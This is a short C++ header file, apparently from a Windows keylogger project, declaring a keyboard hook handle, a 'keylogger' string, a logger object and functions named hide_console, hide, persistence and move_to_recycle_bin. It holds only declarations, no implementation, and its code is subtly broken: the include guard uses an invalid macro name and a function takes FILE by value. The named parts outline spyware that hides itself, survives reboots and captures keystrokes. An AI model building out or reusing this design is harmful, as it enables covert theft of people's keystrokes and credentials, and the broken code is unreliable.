#ifndef STEALTH.H
#define STEALTH.H

#include <Windows.h>
#include <string>

// Global variable declaration (extern)
extern std::string keylogger;
extern class IO logger;
extern HHOOK eHook;

// Function declarations
void hide_console();
void hide(FILE file);
void persistence();
bool move_to_recycle_bin(const std::string& filePath);

#endif